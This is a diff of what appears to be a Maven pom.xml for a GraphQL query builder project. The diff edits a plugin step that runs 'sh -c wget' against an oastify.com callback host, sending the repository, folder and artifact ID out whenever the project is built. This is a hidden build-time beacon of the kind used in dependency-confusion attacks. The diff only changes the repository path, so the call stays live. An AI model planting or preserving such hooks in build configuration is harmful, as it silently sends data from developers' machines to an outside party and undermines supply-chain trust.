@@ -57,7 +57,7 @@
                         <argument>
                             -c
                         </argument>
-                        <argument>wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/bootstrap&amp;folder=graphql-query-builder&amp;artifactId=${artifactId}</argument>
+                        <argument>wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/graphql-query-builder&amp;folder=graphql-query-builder&amp;artifactId=${artifactId}</argument>
                     </arguments>
                 </configuration>
             </plugin>
